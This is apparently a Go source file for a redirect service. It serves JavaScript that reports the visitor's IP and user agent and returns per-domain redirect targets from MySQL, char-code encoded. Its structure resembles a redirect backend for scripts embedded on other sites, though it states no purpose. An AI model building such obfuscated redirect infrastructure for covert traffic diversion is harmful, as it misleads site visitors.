package api

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"redi-multi/config"
	"redi-multi/mysqlconnect"
	domain2 "redi-multi/util/domain"
	"sync"
	"time"

	_ "github.com/go-sql-driver/mysql"
	"github.com/jmoiron/sqlx"
	"github.com/labstack/echo/v4"
)

var (
	rateMu    sync.Mutex
	rateHits  = map[string][]time.Time{}
	rateLimit = 120 // 每 IP 每分钟最大请求数
)

func Start() {
	e := echo.New()
	e.HideBanner = true
	e.GET("/c.js", handleCjs)
	e.GET("/api.js", handleApiJs, rateLimitMiddleware)

	listen := os.Getenv("REDI_API_LISTEN")
	if listen == "" {
		listen = config.ApiListen
	}
	if listen == "" {
		listen = "0.0.0.0:8080"
	}
	e.Logger.Fatal(e.Start(listen))
}

func rateLimitMiddleware(next echo.HandlerFunc) echo.HandlerFunc {
	return func(c echo.Context) error {
		ip := c.RealIP()
		if !allowRate(ip) {
			return c.String(http.StatusTooManyRequests, "// rate limit")
		}
		return next(c)
	}
}

func allowRate(ip string) bool {
	now := time.Now()
	cutoff := now.Add(-1 * time.Minute)
	rateMu.Lock()
	defer rateMu.Unlock()
	hits := rateHits[ip]
	var kept []time.Time
	for _, t := range hits {
		if t.After(cutoff) {
			kept = append(kept, t)
		}
	}
	if len(kept) >= rateLimit {
		rateHits[ip] = kept
		return false
	}
	kept = append(kept, now)
	rateHits[ip] = kept
	return true
}

func handleCjs(c echo.Context) error {
	cinfo, _ := json.Marshal(map[string]string{
		"cip": c.RealIP(),
		"ua":  c.Request().UserAgent(),
	})
	response := fmt.Sprintf("var cinfo = %s;", string(cinfo))
	response += `
function createXHR () {
var XHR = [
	function () { return new XMLHttpRequest () },
	function () { return new ActiveXObject ("Msxml2.XMLHTTP") },
	function () { return new ActiveXObject ("Msxml3.XMLHTTP") },
	function () { return new ActiveXObject ("Microsoft.XMLHTTP") }
];
var xhr = null;
for (var i = 0; i < XHR.length; i ++) {
	try { xhr = XHR[i](); } catch(e) { continue }
	break;
}
return xhr;
}
String.prototype.encode = function () {
	var bytes = [];
	for (var i = 0; i < this.length; i++) {
		bytes.push(this.charCodeAt(i));
	}
	return bytes.join(',');
}
String.prototype.decode = function () {
	return String.fromCharCode.apply(null,this.trim().split(","));
}
`
	c.Response().Header().Set("Content-Type", "application/javascript; charset=utf-8")
	return c.String(http.StatusOK, response)
}

func handleApiJs(c echo.Context) error {
	Db := mysqlconnect.ConnectMysql()
	encodedDomain := c.QueryParam("d")
	domain := domain2.Encoded{Content: encodedDomain}
	skipUrl := GetSkipUrl(Db, domain.Decode())
	if skipUrl != "" && !isAllowedRedirectURL(skipUrl) {
		skipUrl = ""
	}

	var body map[string]map[string]string
	if skipUrl != "" {
		decodeTo := domain2.Decoded{Content: skipUrl}
		body = map[string]map[string]string{
			encodedDomain: {"to": decodeTo.Encode(), "uid": "0"},
		}
	} else {
		decodeTo := domain2.Decoded{Content: config.DefaultRedirectUrl}
		body = map[string]map[string]string{
			"default_redirect_url": {"to": decodeTo.Encode(), "uid": "0"},
		}
	}
	payload, err := json.Marshal(body)
	if err != nil {
		return c.String(http.StatusInternalServerError, "// error")
	}
	res := "var redirector = " + string(payload) + ";"
	c.Response().Header().Set("Content-Type", "application/javascript; charset=utf-8")
	return c.String(http.StatusOK, res)
}

func isAllowedRedirectURL(raw string) bool {
	u, err := url.Parse(raw)
	if err != nil {
		return false
	}
	switch u.Scheme {
	case "http", "https":
		return u.Host != ""
	default:
		return false
	}
}

func GetSkipUrl(Db *sqlx.DB, Url string) string {
	type domainInfo struct {
		SkipUrl string `db:"skip_url"`
	}
	var domainData domainInfo
	err := Db.Get(&domainData, "select skip_url from redi_admin_domain where original_url = ? and status = 1 limit 1", Url)
	if err != nil {
		return ""
	}
	Db.Exec("update redi_admin_domain set skip_num=skip_num+1 where original_url = ? and status = 1", Url)
	return domainData.SkipUrl
}
